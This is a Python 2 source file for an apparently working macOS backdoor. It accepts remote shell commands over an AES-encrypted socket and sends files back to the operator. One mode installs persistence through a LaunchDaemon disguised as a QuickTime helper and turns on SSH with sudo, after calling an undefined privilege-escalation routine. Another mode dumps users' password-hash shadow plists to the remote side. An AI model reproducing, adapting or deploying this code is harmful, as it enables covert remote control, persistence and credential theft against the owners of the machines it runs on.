#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess, socket
import time, sys, os, platform, zipfile
import base64, hashlib
import shutil


#HOST = socket.gethostbyname(socket.gethostname())
#if HOST == '127.0.0.1':
HOST = '127.0.0.1'  # PUT YOUR HOST IP HERE, DELETE IF TO ENFORCE ALWAYS
PORT = 442

#Set the server allotted time for running processes before sending output
RESPONSE_TIME =  3 # 3 seconds


# the block size for the cipher object; must be 32 for AES
BLOCK_SIZE = 32

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
p2 = "4d5aE5gl5g5HbUZ9"

# Define the EOF marker
EOF = 'ab\EOF'

def md5(fname):
    hash = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash.update(chunk)
    return hash.hexdigest()

def sendFile(conn, fileName, cipher):
   with open(fileName, 'rb') as f:
      checksum = md5(fileName)
      print checksum
      print 'sending file'

      fileNam = os.path.basename(fileName)
      conn.send(EncodeAES(cipher, fileNam))
      time.sleep(0.2)

      fileData = f.read(512)
    # Read 1024 bytes and make sure not end of file
      while fileData != '':
         encData = EncodeAES(cipher, fileData)
         conn.send(encData)
         fileData = f.read(512)
         time.sleep(0.2)
    # Send EOF marker
      conn.send(EOF) 
      time.sleep(0.2)
      conn.send(EncodeAES(cipher, checksum))
      f.close()

def recvFile(conn, filePath, cipher):
   fileName = conn.recv(1024)
   fileName = DecodeAES(cipher, fileName)
   filePath += fileName
   time.sleep(0.2)

   with open (filePath, 'wb') as f:   

      fileData = conn.recv(1024)
      while (EOF != fileData):
         fileData = DecodeAES(cipher, fileData)
         f.write(fileData)
         time.sleep(0.2)
         fileData = conn.recv(1024)

      time.sleep(0.2)
      checksum = DecodeAES(cipher, conn.recv(1024))
      f.close()
      if (md5(filePath) != checksum):
         print 'Error in file transfer: md5 hash mismatch'
         sys.exit(1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  getout = 0
  while getout == 0:
     try:
        s.bind((HOST, PORT))
     except socket.error, msg:
        print 'Bind failed. Error Code: ' + str(msg[0]) + '\n\tMessage: ' + msg[1]
        sys.exit()
     s.listen(1)
     conn, addr = s.accept()
     print 'Connection established...'
     time.sleep(1)
     getout = 0

     data = conn.recv(1024)
     #time.sleep(0.5)
     conn.send(p2)
     secret = p2 + data
     
     if (hashlib.md5(secret).hexdigest() != "2c7575b7603e8e55807734a2ed1b5fbb"):
        sys.exit(1)
     # create a cipher with the secret to encrypt dat
     cipher = AES.new(secret)
     time.sleep(1)
     quit = EncodeAES(cipher, "quit")
     qwerty = EncodeAES(cipher, "qwerty")
     yoshi = EncodeAES(cipher, "$<y0shi>")
     
     activity = DecodeAES(cipher, conn.recv(512))

     while activity == '1':
        while 1:
           conn.send(yoshi)
           data = conn.recv(1024)

         # Start a clock to keep track of time
           start = time.time()
         # Check if user wants to quit
           if data == quit: getout=1
           if getout == 1:
              break
           data = DecodeAES(cipher, data)
         # Check if user wants to download a file
           if (data.startswith('px-download')):
              sendFileName = data[12:]
              sendFile(conn, sendFileName, cipher) # Sends the file using my function
              
         # If not, assume it is a command, so run it
           else:
              proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # Wait until RESPONSE_TIME seconds have passed and then respond.
              secondsElapsed = (time.time()-start)
              time.sleep(int(RESPONSE_TIME-secondsElapsed))

              stdoutput = proc.stdout.read() + proc.stderr.read()
              conn.send(EncodeAES(cipher, stdoutput))
        if getout == 1:
           break
     while activity == '2':
        conn.send(EncodeAES(cipher, "Running the script..."))

      # Persistence Script

        BASE_PX_PATH = '/usr/local/etc/ssh'

      # For MAC OS X Systems:
        if platform.system() == 'Darwin':  # OS X
           conn.send(EncodeAES(cipher, 'OSX')) # Let client know server is OSX
         # Gets version in {10.9.2} format  
           osxversion = platform.mac_ver()[0]

           if osxversion[0:2] == '10': 
              if osxversion[3:5] == '10':  
                 if int(osxversion[6:7]) <= 5: 
                    ExploitDYLD()
              elif osxversion[3:4] == '9':
                 if int(osxversion[5:6]) >= 2:
                    ExploitDYLD()
# Create a folder for storing files
           mkdirscript = 'sudo mkdir -p ' + BASE_PX_PATH
           mkdirproc = subprocess.Popen(mkdirscript, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
           time.sleep(0.1)

           pineapplePath = BASE_PX_PATH + '/pineapple.zip'
         # Recieve the appropriate files and unzip them
           recvFile(conn, BASE_PX_PATH, cipher)

         # Verify there is a zipfile named pineapple.zip and if so, extract all contents  
           if zipfile.is_zipfile(pineapplePath):
              pineappleZip = zipfile.ZipFile(pineapplePath, 'r')
              pineappleZip.extractall(BASE_PX_PATH + '/')

         # Create a new priviledged user by running the createUser.sh script
         #  proc = subprocess.Popen("sudo sh " + BASE_PX_PATH + "/osx/createUser.sh", shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)

         # Copy plist LaunchAgent to LaunchDamemons for daemon launch at boot       
           shutil.copy(BASE_PX_PATH + '/osx/com.apple.QuickTimeHelper.plist', '/Library/LaunchDaemons/')
           shutil.copy(BASE_PX_PATH + '/osx/pineapple', BASE_PX_PATH + '/')
           shutil.copy(BASE_PX_PATH + '/osx/pineapple.app', BASE_PX_PATH + '/')

         # Clean up and delete the left over folders  
           shutil.rmtree(BASE_PX_PATH + '/osx/')
           os.remove(pineapplePath)
         # Enable SSH Server
           sshProc = subprocess.Popen('sudo systemsetup -setremotelogin on', shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
           getout = 1 # exit everything
           conn.send(EncodeAES(cipher, 'Done'))

      # For Windows Systems (unfinished):     
        #elif platform.system() == 'Windows':
     
        activity = 0

     # Password Hash Dump
     while activity == 3:
        command = 'dscl . list /Users | grep -v \'^_\''
        proc = subprocess.Popen(command, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        time.sleep(0.2)

        users = proc.stdout.read()
        # Send every shadow plist file for every user except Guest, nobody and daemon
        for user in users:
           if user != 'Guest' and user != 'nobody' and user != 'daemon':
              SHADOW_PLIST_PATH = '/private/var/db/dslocal/nodes/Default/users/' + user + '.plist'
              if (os.path.isfile(SHADOW_PLIST_PATH)):
                 sendFile(conn, SHADOW_PLIST_PATH, cipher)

     conn.close()

  conn.send(EncodeAES(cipher, 'Adeiu'))
  conn.close()
#except socket.error, (value, msg):
#   print "Error: "
#   print  value
#   print " "
#   print msg
finally:
   s.close()


